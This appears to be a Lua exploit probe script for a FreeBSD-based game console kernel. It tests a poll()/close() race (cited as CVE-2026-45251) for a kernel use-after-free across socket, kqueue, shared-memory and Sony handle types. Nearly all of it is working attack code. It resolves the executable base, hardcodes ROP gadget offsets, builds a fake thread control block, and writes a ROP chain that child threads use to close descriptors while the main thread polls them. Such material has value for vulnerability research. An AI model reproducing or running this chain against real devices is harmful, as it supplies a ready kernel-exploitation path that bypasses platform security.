-- CRASH_CLASS: MODERATE
-- PROBE 500a: poll()+close() race on multiple fd types (CVE-2026-45251 concept)
--
-- CVE-2026-45251 (FreeBSD-SA-26:19): closing a descriptor while another thread
-- is blocked in poll(2) can free the underlying object without waking the poller.
-- The advisory names procdesc (pdfork — nosys on 14.10) but says "some descriptor
-- types" failed to unlink poll waiters.  We test every fd type the game process
-- can create: sockets, kqueues, shm objects, and Sony evf/namedobj handles.
--
-- Race: main thread calls poll(fd, POLLIN, 5000).  A child thread via thr_new(455)
-- closes the same fd at native speed.  If the close path forgets seldrain(),
-- the main thread touches freed memory on wakeup → kernel UAF.
--
-- We run 50 iterations per fd type.  A surviving process means the close path
-- is safe for that type.  A crash/hang signals the bug is live.

print("=== PROBE 500a: poll()+close() race (CVE-2026-45251 concept) ===")
print("")

------------------------------------------------------------------ helpers
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt_hex(val)
    local h, l = get_hi_lo(val)
    if h == 0 then return string.format("0x%X", l) end
    return string.format("0x%X%08X", h, l)
end

------------------------------------------------------------------ resolve eboot base
local info = memory.alloc(0x200)
safe_wd(info, 0x160)
local sc593 = make_syscall(593)
pcall(function() sc593(uint64(0), info) end)  -- handle 0 = eboot
local eb_lo = safe_rd(info + 0x108)
local eb_hi = safe_rd(info + 0x10C)
if not eb_lo or not eb_hi then
    print("FATAL: cannot read eboot base")
    return
end
local eboot = uint64(string.format("0x%X%08X", eb_hi, eb_lo))
print("eboot base: " .. fmt_hex(eboot))

-- fn_addr = libkernel syscall stub (from loader metadata)
local pipe_str = tostring(syscall.pipe)
local fn_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
if not fn_str then
    print("FATAL: cannot resolve fn_addr")
    return
end
local fn_addr = uint64(fn_str)
print("fn_addr (syscall stub): " .. fn_str)

------------------------------------------------------------------ gadgets
local pop_rax_ret   = eboot + uint64(0x992)
local pop_rdi_ret   = eboot + uint64(0xC9DFE)
local pop_rsi_ret   = eboot + uint64(0xD77D)
local pop_rdx_ret   = eboot + uint64(0x3B02D7)

------------------------------------------------------------------ fake TCB (once, reused)
local fake_tcb = memory.alloc(0x1000)
for i = 0, 0xFF8, 8 do safe_wq(fake_tcb + i, fake_tcb) end  -- self-referencing
local tcb_ptr_buf = memory.alloc(8)
safe_wq(tcb_ptr_buf, fake_tcb)

------------------------------------------------------------------ syscalls
local sc455   = make_syscall(455)   -- thr_new
local sc209   = make_syscall(209)   -- poll
local sc135   = make_syscall(135)   -- socketpair
local sc362   = make_syscall(362)   -- kqueue
local sc482   = make_syscall(482)   -- shm_open
local sc538   = make_syscall(538)   -- evf_create (Sony)
local sc557   = make_syscall(557)   -- namedobj_create (Sony)
local sc6     = make_syscall(6)     -- close
local sc624   = make_syscall(624)   -- VM op counter (side channel)
local sc20    = make_syscall(20)    -- getpid

local pid = to_num(sc20())
print("pid: " .. pid)

------------------------------------------------------------------ build child ROP chain
-- Child does: sysarch(SET_FSBASE=129, tcb_ptr_buf) → close(target_fd) → thr_exit(0)
-- start_func = pop_rsi_ret, arg = 129 (SET_FSBASE, arrives in rdi)
-- Stack: [tcb_ptr_buf] [pop_rax_ret] [165=sysarch] [fn_addr]
--        [pop_rdi_ret] [target_fd]  [pop_rax_ret] [6=close] [fn_addr]
--        [pop_rdi_ret] [0]          [pop_rax_ret] [431=thr_exit] [fn_addr]

local STACK_SIZE = 0x200000  -- 2 MiB

local function run_poll_close_race(fd_name, create_fd_fn, iterations)
    print("")
    print("--- " .. fd_name .. " (" .. iterations .. " iterations) ---")
    local survived = 0
    local poll_results = {}

    for i = 1, iterations do
        -- create a fresh fd
        local target_fd = create_fd_fn()
        if not target_fd or target_fd < 0 then
            print("  [" .. i .. "] fd creation failed, skip")
            break
        end

        -- map child stack
        local sc477 = make_syscall(477) -- mmap
        local child_stack = sc477(uint64(0), uint64(STACK_SIZE), uint64(0x3),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
        local cs_h, cs_l = get_hi_lo(child_stack)
        if cs_h == 0 and cs_l == 0 then
            print("  [" .. i .. "] mmap failed for stack")
            pcall(function() sc6(uint64(target_fd)) end)
            break
        end

        -- RSP = ((stack_base + stack_size) & ~0xF) - 8
        local rsp = (child_stack + uint64(STACK_SIZE))
        -- align: rsp & ~0xF then -8
        local rsp_num_lo = to_num(rsp)
        rsp_num_lo = math.floor(rsp_num_lo / 16) * 16 - 8
        -- recalculate as offset from child_stack
        local chain_base = child_stack + uint64(STACK_SIZE) - uint64(0x100)  -- safe margin
        local off = 0
        local function wq(val) safe_wq(chain_base + off, val); off = off + 8 end

        -- sysarch(SET_FSBASE=129, tcb_ptr_buf)
        wq(tcb_ptr_buf)               -- pop rsi → tcb_ptr_buf
        wq(pop_rax_ret)
        wq(uint64(165))               -- SYS_sysarch
        wq(fn_addr)

        -- close(target_fd)
        wq(pop_rdi_ret)
        wq(uint64(target_fd))
        wq(pop_rax_ret)
        wq(uint64(6))                 -- SYS_close
        wq(fn_addr)

        -- thr_exit(0)
        wq(pop_rdi_ret)
        wq(uint64(0))
        wq(pop_rax_ret)
        wq(uint64(431))               -- SYS_thr_exit
        wq(fn_addr)

        -- build thr_param
        local param = memory.alloc(0x40)
        for j = 0, 0x38, 4 do safe_wd(param + j, 0) end
        safe_wq(param + 0x00, pop_rsi_ret)      -- start_func = pop rsi; ret
        safe_wq(param + 0x08, uint64(129))       -- arg = 129 (SET_FSBASE) → rdi
        safe_wq(param + 0x10, child_stack)       -- stack_base
        safe_wq(param + 0x18, uint64(STACK_SIZE))-- stack_size

        -- RSP for thr_new = chain_base (the child's ret after start_func lands here)
        -- Actually thr_new sets RSP = ((base+size) & ~0xF) - 8
        -- We need the chain at that RSP.  Recalculate:
        -- RSP will be ((child_stack + STACK_SIZE) & ~0xF) - 8
        -- So we need to rewrite the chain starting there.

        -- Recalculate the actual RSP
        local stack_top_h, stack_top_l = get_hi_lo(child_stack + uint64(STACK_SIZE))
        local aligned_l = math.floor(stack_top_l / 16) * 16 - 8
        -- Since start_func is called, the "return address" is at RSP.
        -- start_func = pop_rsi_ret: it does  pop rsi (from [RSP]); ret (to [RSP+8])
        -- So [RSP] = value for rsi, [RSP+8] = next gadget address

        -- Rewrite chain at the correct RSP
        local real_rsp = child_stack + uint64(STACK_SIZE - 0x10 + 0x10 - 0x8)
        -- More precisely: RSP = (base + size) rounded down to 16, minus 8
        -- Let's just compute it properly:
        local top = child_stack + uint64(STACK_SIZE)
        -- top & ~0xF:  we subtract (top % 16)
        local top_lo = to_num(top)
        local alignment_fix = top_lo % 16
        local rsp_val = top - uint64(alignment_fix) - uint64(8)

        -- Now write chain at rsp_val
        -- The function call convention: call pushes return addr, but thr_new
        -- doesn't call — it sets RIP and RSP directly.
        -- start_func(arg): RIP=start_func, RDI=arg, RSP=rsp_val
        -- pop_rsi_ret at RIP: pop [RSP] → rsi, RSP+=8; ret → [RSP], RSP+=8
        off = 0
        local function wq2(val) safe_wq(rsp_val + off, val); off = off + 8 end

        wq2(tcb_ptr_buf)              -- [RSP+0] popped into rsi
        wq2(pop_rax_ret)              -- [RSP+8] ret target
        wq2(uint64(165))              -- rax = SYS_sysarch
        wq2(fn_addr)                  -- syscall; ret
        wq2(pop_rdi_ret)              -- next gadget
        wq2(uint64(target_fd))        -- rdi = fd to close
        wq2(pop_rax_ret)
        wq2(uint64(6))                -- rax = SYS_close
        wq2(fn_addr)
        wq2(pop_rdi_ret)
        wq2(uint64(0))                -- rdi = 0
        wq2(pop_rax_ret)
        wq2(uint64(431))              -- rax = SYS_thr_exit
        wq2(fn_addr)

        -- Spawn child — it will close target_fd at native speed
        local thr_ret = pcall(function()
            sc455(uint64(to_num(param)), uint64(0x38))
        end)

        -- IMMEDIATELY poll on target_fd — race the child's close()
        local pollfd = memory.alloc(8)
        safe_wd(pollfd + 0, target_fd)  -- fd
        safe_wd(pollfd + 4, 0x0001)     -- events = POLLIN; revents at +6

        local poll_ret_val = nil
        local poll_ok, poll_ret = pcall(function()
            return sc209(uint64(to_num(pollfd)), uint64(1), uint64(100))  -- 100ms timeout
        end)

        if poll_ok then
            poll_ret_val = to_num(poll_ret)
        else
            poll_ret_val = "CRASH"
        end

        local revents = safe_rd(pollfd + 4)
        local revents_hi = 0
        if revents then revents_hi = math.floor(revents / 65536) end

        survived = survived + 1
        local key = tostring(poll_ret_val) .. "/" .. string.format("0x%X", revents_hi or 0)
        poll_results[key] = (poll_results[key] or 0) + 1

        -- unmap child stack
        local sc73 = make_syscall(73) -- munmap
        pcall(function() sc73(child_stack, uint64(STACK_SIZE)) end)

        -- small yield between iterations
        if i % 10 == 0 then
            print("  progress: " .. i .. "/" .. iterations)
        end
    end

    print("  survived: " .. survived .. "/" .. iterations)
    print("  poll results distribution:")
    for k, v in pairs(poll_results) do
        print("    " .. k .. " : " .. v .. "x")
    end
end

------------------------------------------------------------------ VM op counter baseline
local vm_before = to_num(sc624())
print("VM ops baseline (sys 624): " .. vm_before)

------------------------------------------------------------------ fd creators
local function create_socket()
    -- AF_UNIX SOCK_DGRAM socketpair, return one end
    local sv = memory.alloc(8)
    safe_wd(sv, 0xFFFFFFFF)
    safe_wd(sv + 4, 0xFFFFFFFF)
    local ret = pcall(function() sc135(uint64(1), uint64(2), uint64(0), uint64(to_num(sv))) end)
    local fd0 = safe_rd(sv)
    local fd1 = safe_rd(sv + 4)
    if fd0 and fd0 ~= 0xFFFFFFFF and fd1 and fd1 ~= 0xFFFFFFFF then
        -- close fd1 (we only need fd0 for the race)
        pcall(function() sc6(uint64(fd1)) end)
        return fd0
    end
    return nil
end

local function create_tcp_socket()
    -- AF_INET SOCK_STREAM
    local sc97 = make_syscall(97) -- socket
    local ok, fd = pcall(function() return sc97(uint64(2), uint64(1), uint64(0)) end)
    if ok then
        local fd_val = to_num(fd)
        if fd_val > 0 and fd_val < 0xFFFF then return fd_val end
    end
    return nil
end

local function create_udp_socket()
    -- AF_INET SOCK_DGRAM
    local sc97 = make_syscall(97)
    local ok, fd = pcall(function() return sc97(uint64(2), uint64(2), uint64(0)) end)
    if ok then
        local fd_val = to_num(fd)
        if fd_val > 0 and fd_val < 0xFFFF then return fd_val end
    end
    return nil
end

local function create_kqueue()
    local ok, fd = pcall(function() return sc362() end)
    if ok then
        local fd_val = to_num(fd)
        if fd_val > 0 and fd_val < 0xFFFF then return fd_val end
    end
    return nil
end

local function create_shm()
    -- SHM_ANON
    local SHM_ANON = uint64(1)
    local ok, fd = pcall(function()
        return sc482(SHM_ANON, uint64(0x602), uint64(0x1FF))  -- O_CREAT|O_RDWR|O_EXCL, 0777
    end)
    if ok then
        local fd_val = to_num(fd)
        if fd_val > 0 and fd_val < 0xFFFF then return fd_val end
    end
    return nil
end

local evf_counter = 0
local function create_evf()
    evf_counter = evf_counter + 1
    local name = memory.alloc(32)
    local tag = "evf_" .. tostring(evf_counter)
    for ci = 1, #tag do safe_wd(name + ci - 1, string.byte(tag, ci)) end
    safe_wd(name + #tag, 0)
    local ok, ret = pcall(function()
        return sc538(uint64(to_num(name)), uint64(0x100))
    end)
    if ok then
        local h = to_num(ret)
        if h > 0 and h ~= 0xFFFFFFFF then return h end
    end
    return nil
end

local nobj_counter = 0
local function create_namedobj()
    nobj_counter = nobj_counter + 1
    local name = memory.alloc(32)
    local tag = "no_" .. tostring(nobj_counter)
    for ci = 1, #tag do safe_wd(name + ci - 1, string.byte(tag, ci)) end
    safe_wd(name + #tag, 0)
    local ok, ret = pcall(function()
        return sc557(uint64(to_num(name)), uint64(0))
    end)
    if ok then
        local h = to_num(ret)
        if h > 0 and h ~= 0xFFFFFFFF then return h end
    end
    return nil
end

------------------------------------------------------------------ canary
local canary = to_num(sc20())
print("canary (getpid): " .. canary)
print("")

------------------------------------------------------------------ run races
local ITERS = 50

print("=== PHASE 1: Socket types ===")
run_poll_close_race("AF_UNIX SOCK_DGRAM (half-pair)", create_socket, ITERS)
run_poll_close_race("AF_INET SOCK_STREAM (TCP)", create_tcp_socket, ITERS)
run_poll_close_race("AF_INET SOCK_DGRAM (UDP)", create_udp_socket, ITERS)

print("")
print("=== PHASE 2: Kernel objects ===")
run_poll_close_race("kqueue fd", create_kqueue, ITERS)
run_poll_close_race("shm_open (SHM_ANON)", create_shm, ITERS)

print("")
print("=== PHASE 3: Sony descriptor types ===")
run_poll_close_race("Sony evf (538)", create_evf, ITERS)
run_poll_close_race("Sony namedobj (557)", create_namedobj, ITERS)

------------------------------------------------------------------ post-race checks
print("")
print("=== POST-RACE VERIFICATION ===")
local canary2 = to_num(sc20())
print("canary after: " .. canary2 .. (canary2 == canary and " [OK]" or " [CHANGED!]"))

local vm_after = to_num(sc624())
print("VM ops after: " .. vm_after .. " (delta: " .. (vm_after - vm_before) .. ")")

print("")
print("=== PROBE 500a COMPLETE ===")
